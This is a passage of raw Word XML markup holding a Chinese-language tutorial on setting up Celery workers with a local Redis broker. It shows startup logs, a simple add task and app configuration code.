          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个命令启动了一个</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用来执行程序中</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>add</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个加法任务（</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E59A9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然后看到界面显示结果如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5468EE9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celery@luanpeng-XPS15R v4.2.1 (windowlicker)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5895AA2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 ----- </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00AD581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 ***  * -- Linux-4.15.0-33-generic-x86_64-with-Ubuntu-16.04-xenial 2018-09-24 19:19:11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151812A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 - **** --- </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578FD33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 ---------- [config]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A73F8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 ---------- .&gt; app:         tasks:0x7f34ba22dcc0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023C41E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 ---------- .&gt; transport:   redis://127.0.0.1:6379/5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB844E8"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 ---------- .&gt; results:     disabled://</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24384EE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 --- * --- .&gt; concurrency: 8 (prefork)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F37BD8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lastRenderedPageBreak/>
        <w:t>-- ******* ---- .&gt; task events: OFF (enable -E to monitor tasks in this worker)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="386D993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 ----- </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9B91EB"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 [queues]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E39D46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.&gt; celery           exchange=celery(direct) key=celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B95C90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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4D330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38AC9E6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[tasks]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51462BF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 tasks.add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C10717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DDD2BC1"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[2018-09-24 19:19:11,186: INFO/MainProcess] Connected to redis://127.0.0.1:6379/5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E4894B"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[2018-09-24 19:19:11,193: INFO/MainProcess] mingle: searching for neighbors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5273D79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[2018-09-24 19:19:12,212: INFO/MainProcess] mingle: all alone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4122916D"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[2018-09-24 19:19:12,224: INFO/MainProcess] celery@luanpeng-XPS15R ready.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA0EBDE" w14:textId="03567A8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我们可以看到</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正常工作在名称</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>luanpeng-XPS15R</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的虚拟主机上，版本为</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>v4.2.1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，在下面的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>[config]</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中我们可以看到当前</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的名称</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>tasks</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，运输工具</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>transport</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>就是我们在程序中设置的中间人</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis://127.0.0.1:6379/5</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result</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>我们没有设置，暂时显示为</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>disabled,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>然后我们也可以看到</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缺省使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>perfork</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来执行并发，当前并发数显示为</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，然后可以看到下面的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>[queues]</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>就是我们说的队列，当前默认的队列是</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然后我们看到下面的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>[tasks]</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中有一个任务</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>task_name.</w:t>
      </w:r>
      <w:r w:rsidR="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E855C8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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>生产者</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3B2EFB"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生产者发送消息启动。按照生产者所在目录引入</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中的</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函数（也会把</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的名称获取到）。调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>delay</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数（</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>apply_async()</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法的升级版）时会发起这样一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>name</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就可以了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62865D2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例如在上层目录发起任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AF7DE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app1.app1 import add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027DC24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result = add.delay(1,2)   # apply_async()</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法的升级版</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9258C9"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print(result)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6264E5B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启动后，消费者开始处理消息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53CCC3D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[2018-09-24 20:07:11,496: INFO/MainProcess] Received task: app1.tasks.add[8207c280-0864-4b1e-8792-155de5417406]  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7182EC3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[2018-09-24 20:07:11,501: INFO/ForkPoolWorker-4] Task app1.tasks.add[8207c280-0864-4b1e-8792-155de5417406] succeeded in 0.003930353002942866s: 12</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46AC1E1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第一行说明</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收到了一个任务：</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1.tasks.add,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这里我们和之前发送任务返回的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>AsyncResult</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对比我们发现，每个</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都有一个唯一的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ID</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，第二行说明了这个任务执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>succeed,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>执行结果为</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540C4AB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查看资料说调用任务后会返回一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>AsyncResult</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>实例，可用于检查任务的状态，等待任务完成或获取返回值（如果任务失败，则为异常和回溯）。但这个功能默认是不开启的，需要设置一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Celery </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的结果后端（</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>backend</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>），也就是</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>tasks.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置的使用</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进行结果存储。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769B95A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通过这个例子后我对</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有了初步的了解，然后我在这个例子的基础上去进一步的学习。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C886C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因为</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是用</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编写的，所以为了让代码结构化一些，就像一个应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE73DD0"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054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="717CD4DB" wp14:editId="5CFED815">
            <wp:extent cx="2987299" cy="2049958"/>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87299" cy="2049958"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3B0CE9" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00054E4F" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="225" w:after="225"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1/app1_app.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6B10E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celery import Celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7874219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import os,io</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3A912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在</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>目录同级目录执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>celery -A app1.app1_app worker -l info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53DE53A9"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app = Celery(main='app1.app1_app',include=['app1.tasks1','app1.tasks2'])  # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>创建</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，并引入任务定义。</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>main</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>include</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数的值为模块名，所以都是指定命令的相对目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133C6ED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app.config_from_object('app1.app1_config')   # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>通过配置文件进行配置，而着这里是相对目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1074C59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broker</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置中间件，</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>backend</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置后端存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACBD32B"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app = Celery('app1.app1_app',broker='redis://127.0.0.1:6379/5',backend='redis://127.0.0.1:6379/6',include=['app1.tasks1','app1.task2'])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2870F8C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if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1103DFC1"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log_path = os.getcwd()+'/log/celery.log'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CABA83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if(not os.path.exists(log_path)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4060E2D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f = open(log_path, 'w')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FEAB63B"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f.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5DDFC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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
